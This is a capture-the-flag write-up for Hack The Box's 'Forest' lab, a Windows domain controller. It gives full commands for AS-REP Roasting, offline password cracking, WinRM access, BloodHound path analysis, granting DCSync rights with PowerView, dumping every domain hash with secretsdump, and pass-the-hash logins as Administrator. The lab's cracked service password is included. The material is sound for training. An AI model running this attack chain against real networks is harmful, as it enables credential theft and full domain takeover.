---
title: Forest - Hack The Box
categories: [Windows, Domain Controller, DC, Active Directory, AD, LDAP, ldapsearch, AS-REP Roasting, Kerberos, GetNPUsers, Impacket, RPC, rpcclient, John the Ripper, WinRM, Windows Remote Management, CrackMapExec, Evil-WinRM, SharpHound, BloodHound, Account Operators, WriteDacl, DCSync, MS-DRSR, PowerView, PowerSploit, Add-DomainObjectAcl, secretsdump, Pass the Hash, PtH, psexec]
published: true
lang: en
---

Today we are going to solve _Hack The Box's_ _Forest_ machine. It is a _Windows_ machine with a medium difficulty level for intrusion, and medium for privilege escalation as listed on the platform.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/1.png){:class="blog-image" onclick="expandImage(this)"}

### [](#header-3)Reconnaissance Phase

First, we’re going to launch an _ICMP traceroute_ to check if the machine is active.

```
ping -c 1 10.10.10.161
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/2.png){:class="blog-image" onclick="expandImage(this)"}

Once we verify that the machine is active (as it returns a response), we can also determine what type of machine we are dealing with based on the _TTL_ value; in this case, the machine’s _TTL_ value is `127`, so we can infer that we are dealing with a _Windows_ machine. Remember, some of the reference values are as follows:

| Operating System (OS)  | TTL |
|:-----------------------|:----|
| Linux                  | 64  |
| Windows                | 128 |
| Solaris                | 254 | 

If we notice, in this case, the _TTL_ value is `127` instead of `128` as indicated in the table above. This is because, in the _Hack The Box_ environment, we are not communicating directly with the target machine; instead, there is an intermediary node, which causes the _TTL_ to decrease by one unit.

```
ping -c 1 10.10.10.161 -R
``` 

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/3b.png){:class="blog-image" onclick="expandImage(this)"}

Next, we will use the _Nmap_ tool to determine which ports are open, as well as identify the version and services running on the asset. To determine which ports are open, we can do the following:

```bash
nmap -p- --open -T5 -v -n 10.10.10.161
```

If the scan takes too long to complete, we have this alternative:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.161
```

Below is an explanation of the parameters used in the port scan with _Nmap_:


| Parameter | Explanation |
|:----------|:------------|
| \-p\- | Scans the entire range of ports (65535 in total) |
| \-\-open | Shows all ports that are open (or possibly open) |
| \-T5 | The timing template allows us to speed up our scan; this value can range from 0 to 5. Note that the higher the value of the template, the more "noise" we generate, but that’s okay, right? After all, we’re practicing in a controlled environment, and here we are all `White Hat` | 
| \-v | _Verbose_, reports findings to the console |
| \-n | Do not apply _DNS resolution_ |
| \-sS | _TCP SYN_ scan |
| \-min-rate | Send packets no slower than \<value\> per second |
| \-vvv | Triple _verbose_, to get more information in the console |
| \-Pn | Do not apply _host discovery_ |

Once we have detected the open ports on the asset, we can move on to determine the version and services running on these ports.

```bash
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49957 10.10.10.161
```

Below is an explanation of the parameters used in the version and service scan with _Nmap_:

| Parameter | Explanation |
|:----------|:------------|
| \-sC | Basic enumeration scripts |
| \-sV | Version and services running on the found ports |
| \-p | Specify which ports we want to analyze (those found open in the previous step) |

Based on the information reported by _Nmap_, we can see that the target machine has open ports related to `DNS` (53), `Kerberos authentication` (88), `RPC` (135), `NetBIOS` (139), `LDAP` (389), `SMB` (445) and `WinRM` (5985). We can infer that we are dealing with a _Domain Controller (DC)_ and we are in an _Active Directory (AD)_ environment.

### [](#header-3)Exploitation Phase 

The first thing we’ll do is check if the machine has network-shared resources via a _null session_, since we don’t have credentials; for this, we can use tools like _SMBMap_ or _smbclient_. However, we won’t be able to list anything.

```bash
smbmap -H 10.10.10.161
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/4.png){:class="blog-image" onclick="expandImage(this)"}

```bash
smbclient -N -L 10.10.10.161
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/5.png){:class="blog-image" onclick="expandImage(this)"}

Next, we can try to enumerate the `LDAP` protocol to obtain information about users, groups, or other objects in the environment. To do this, we will use the `ldapsearch` tool.

Our first goal will be to identify the _Naming Context_, which is the _Distinguished Name (DN)_ that represents the highest level in the _Directory Information Tree (DIT)_ and will serve as the base for our queries. We will use the following command:

```bash
ldapsearch -x -h 10.10.10.161 -s base namingcontexts
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/6.png){:class="blog-image" onclick="expandImage(this)"}

The _dn_ field is empty because we are querying the base object of the directory. The _namingContexts_ fields list the different _Naming Contexts_ of the _LDAP_ server. Each entry in _namingContexts_ represents a different part of the _LDAP_ directory that can be the base for various searches.

We will use `DC=htb,DC=local` as the basis for our queries because this is the main _Naming Context_ representing the `htb.local` domain, including users, groups, and other main objects. The other _Naming Contexts_ (CN=Configuration, CN=Schema, DC=DomainDnsZones, DC=ForestDnsZones) are specific for configurations and schemas within the _AD_ environment.

Once we obtain the _DN_, we can start making specific queries, or we could list all the _LDAP_ information with the following command:

```bash
ldapsearch -x -h 10.10.10.161 -b "dc=htb,dc=local"
```

| Parameter | Explanation |
|:----------|:------------|
| \-x | Simple authentication |
| \-h | Host |
| \-s | Search scope |
| \-b | Base DN for the search |

We can start by searching for entries that contain the _user_ object class to list system users.

```bash
ldapsearch -x -h 10.10.10.161 -b "dc=htb,dc=local" '(objectClass=user)'
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/7.png){:class="blog-image" onclick="expandImage(this)"}

In the _sAMAccountName_ fields of each user, we will find their respective usernames. With a potential list of users at our disposal, we might consider an `AS-REP Roasting` attack.

The `AS-REP Roasting` attack exploits a weakness in `Kerberos` authentication in _Active Directory_ environments. This attack begins by sending an _Authentication Server Request (AS-REQ)_ message to the _DC_ for users who are configured not to require _Kerberos_ pre-authentication. If the user’s account is configured this way, the _DC_ will respond with an _Authentication Server Response (AS-REP)_ message, which contains a _Ticket Granting Ticket (TGT)_ issued by the _Key Distribution Center (KDC)_. This _TGT_ may be vulnerable to brute-force attacks if the password is weak, allowing us to crack the user’s password without having to perform a full authentication. This vulnerability is exploited because the server responds with an _AS-REP_ message instead of rejecting the request due to the lack of pre-authentication.

With this in mind, instead of searching for users manually one by one, we can use a one-liner to filter and parse the users directly.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/8.png){:class="blog-image" onclick="expandImage(this)"}

We can further refine the list of users obtained to focus exclusively on relevant accounts. The first two accounts, _DefaultAccount_ and _Guest_, are created by the _AD_ itself (although _Guest_ is not enabled by default). Accounts ending in _$_ are _computer accounts_, while the _$331000-VK4ADACQNUCA_ account has an unusual format and could be a specialservice account or automatically generated. Accounts starting with _SM\__ and _HealthMailbox_ are related to the _Microsoft Exchange_ service. This leaves us with five potential users for our analysis.

The next thing we’ll do is use the `GetNPUsers` script from the `Impacket` suite. To run it, we need to provide the _AD_ domain name we want to target. To set this up, we will edit the `/etc/hosts` file to ensure that the domain name resolves to the corresponding IP address of the server.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/9.png){:class="blog-image" onclick="expandImage(this)"}

With this done, the command we will use is the following:

```bash
impacket-GetNPUsers htb.local/ -no-pass -userfile archivoListadoUsuarios 
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/10.png){:class="blog-image" onclick="expandImage(this)"}

Interestingly, none of the users we obtained seem to be vulnerable to `AS-REP Roasting`. Therefore, we will proceed to enumerate another protocol identified during our _Nmap_ scan, `RPC`.

We will use `rpcclient`, again using a _null session_, as we don't have credentials. We verify that we can connect successfully, so we will proceed to enumerate additional information. We could list domain groups using _enumdomgroup_ or, alternatively, list domain users again using _enumdomusers_.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/11.png){:class="blog-image" onclick="expandImage(this)"}

We observe three new users that we hadn’t detected when enumerating with _ldapsearch_. We’re interested in `svc-alfresco`, as both Administrator and krbtgt are created by the _AD_ itself.

If we recall, when we used _ldapsearch_, we filtered for users whose object class contained _user_, and the five users we previously found meet this condition.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/12.png){:class="blog-image" onclick="expandImage(this)"}

However, upon further investigation, we discover that this "user" `svc-alfresco` does not have a defined object class. This is likely because it belongs to the _Organizational Unit (OU)_ of Service Accounts.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/13.png){:class="blog-image" onclick="expandImage(this)"}

Once again, by using a one-liner, we could filter and parse the users, refine the list, and use it with `Impacket` to check if this new user is vulnerable to `AS-REP Roasting`.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/14.png){:class="blog-image" onclick="expandImage(this)"}

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/15.png){:class="blog-image" onclick="expandImage(this)"}

We find that `svc-alfresco` is vulnerable to `AS-REP Roasting`, and we obtain a hash that we will attempt to crack by brute force using `John the Ripper` along with the [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/tag/data) dictionary.

If we don’t have `John the Ripper` installed, we can do the following:

```bash
sudo apt install john
```

```bash
john --wordlist=/path/to/rockyou.txt/dictionary/ hash
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/16.png){:class="blog-image" onclick="expandImage(this)"}

Once we obtain the password for the `svc-alfresco` user, we can validate the credential before attempting to connect to the target machine to ensure it is correct. Recall that during our _Nmap_ scan, we observed that the `WinRM` (_Windows Remote Management_) service is active on the target machine; this will be the protocol we will use for the connection.

To validate the credential, we will use _CrackMapExec_ with the following command:

```bash
crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/17.png){:class="blog-image" onclick="expandImage(this)"}

We realize that the credential is not only valid, but also that this user belongs to the _Remote Management Users_ group,  as we see a message next to the username saying _Pwn3d!_. Therefore, we can connect to the target machine using `Evil-WinRM`.

We will proceed to connect as follows:

```bash
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/18.png){:class="blog-image" onclick="expandImage(this)"}

### [](#header-3)Privilege Escalation

Once inside the target machine, we can start gathering information from the _Active Directory_ to allow us to escalate privileges. To do this, we will use `SharpHound`, a data collector for `BloodHound`, a tool that allows us to analyze and visualize relationships and permissions within an _Active Directory_ environment to identify potential privilege escalation paths.

The first thing we will do is download [SharpHound](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1) to our machine. One convenient feature of `Evil-WinRM` is that it allows us to easily upload and download files. To upload the `SharpHound.ps1` file to the target machine, we execute the following command:

```bash
upload SharpHound.ps1
```

Once uploaded, we will import and use the `Invoke-BloodHound` function to collect all the necessary information.

```powershell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

This will generate a compressed file containing all the _AD_ information. To download this file to our machine, we use the following command:

```bash
download <timestamp>_BloodHound.zip BloodHound.zip
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/19.png){:class="blog-image" onclick="expandImage(this)"}

The next step is to import the compressed file generated by `SharpHound` into `BloodHound`. If we don’t have the tool installed, we can do the following:

```bash
sudo apt install neo4j bloodhound
```

_Neo4j_ is the graph database used by `BloodHound`. We will start it as follows:

```bash
sudo neo4j console
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/20.png){:class="blog-image" onclick="expandImage(this)"}

It will instruct us to navigate to [http://localhost:7474/](http://localhost:7474/). To connect to _Neo4j_ for the first time, the default credentials we will enter are:

* Username: neo4j
* Password: neo4j

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/21.png){:class="blog-image" onclick="expandImage(this)"}

It will then prompt us to change the password, which we will use for `BloodHound`.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/22.png){:class="blog-image" onclick="expandImage(this)"}

Once we open `BloodHound` and log in, on the right side, we will see a section labeled _Upload Data_. This is where we will upload our compressed file.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/23.png){:class="blog-image" onclick="expandImage(this)"}

In the search bar at the top left, we can search for the user we just compromised, `svc-alfresco`. We can right-click on it and select _Mark User as Owned_.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/24.png){:class="blog-image" onclick="expandImage(this)"}

If we go to the _Analysis_ section, we will find a _Shortest Paths_ section. Within this section, we select _Shortest Path from Owned Principals_. When we click, a graph will display showing the best path to become a system administrator.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/25.png){:class="blog-image" onclick="expandImage(this)"}

We can see that `svc-alfresco` is a member of the _Service Accounts_ group, which is a member of the _Privileged IT Accounts_ group, which in turn is a member of the _Account Operators_ group. Additionally, the _Account Operators_ group has _GenericAll_ permissions over the _Exchange Windows Permissions_ group, which grants it full control over this group. The _Exchange Windows Permissions_ group has _WriteDacl_ permissions over the domain, allowing it to modify the domain’s Discretionary Access Control List (_DACL_).

Let's break this down: the _Account Operators_ group grants limited account creation privileges to a user. Therefore, the `svc-alfresco` user can create additional accounts in the domain. Additionally, the _Account Operators_ group has _GenericAll_ permissions over the _Exchange Windows Permissions_ group, meaning `svc-alfresco` can modify the permissions of the _Exchange Windows Permissions_ group. Finally, the _Exchange Windows Permissions_ group has _WriteDacl_ permissions over the domain. We will exploit this to grant ourselves `DCSync` privileges.

The `DCSync` attack simulates the behavior of a _Domain Controller_ and requests other _Domain Controllers_ to replicate information using the Directory Replication Service Remote Protocol (_MS-DRSR_). Since this protocol is essential to _Active Directory’s_ functionality, it cannot be disabled. By performing this attack, we can replicate domain information and dump all the domain hashes.

With all this said, the first thing we will do is take advantage of `svc-alfresco` being a member of the _Account Operators_ group and create a new user. To do this, we will use the following command:

```bash
net user username password /add /domain
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/26.png){:class="blog-image" onclick="expandImage(this)"}

The next step is to add the newly created user to the _Exchange Windows Permissions_ group, taking advantage of the full control that `svc-alfresco` full control has over this group:

```powershell
Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members "username"
```

We will also add this user to the _Remote Management Users_ group so that it can connect via `Evil-WinRM`:

```powershell
Add-ADGroupMember -Identity "Remote Management Users" -Members "username"
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/27.png){:class="blog-image" onclick="expandImage(this)"}

By adding the user to the _Remote Management Users_ group, we avoid the use of _PSCredentials_, which are normally used to execute commands with another user’s credentials, which personally caused conflicts with `PowerView`.

Next, we will close the current `Evil-WinRM` session and reconnect with the newly created user. Once connected as the new user, we will download the [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) script to our machine, which is part of `PowerSploit` (a collection of PowerShell scripts). As before, we will upload it using `Evil-WinRM` and then import it:

```powershell
upload PowerView.ps1
Import-Module .\PowerView.ps1
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/28.png){:class="blog-image" onclick="expandImage(this)"}

Once imported, we will use the `Add-DomainObjectAcl` function to grant `DCsync` permissions to our newly created user:

```bash
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity username -Rights DCSync
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/29.png){:class="blog-image" onclick="expandImage(this)"}

With `DCsync` permissions granted to our user, we can use `secretsdump`, another script from the `Impacket` suite, to dump all domain users’ hashes:

```bash
impacket-secretsdump htb.local/username:password@10.10.10.161
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/30.png){:class="blog-image" onclick="expandImage(this)"}

Finally, we can perform a `Pass the Hash` attack, which involves using the _hash_ we just obtained instead of the password (which we don’t know) to authenticate. For this, we could use `psexec` (another script from `Impacket`) or alternatively, via `Evil-WinRM` itself.

```bash
evil-winrm -i 10.10.10.161 -u 'Administrator' -H 'HASH'
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/31.png){:class="blog-image" onclick="expandImage(this)"}

```bash
impacket-psexec administrator@10.10.10.161 -hash HASH
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/32.png){:class="blog-image" onclick="expandImage(this)"}
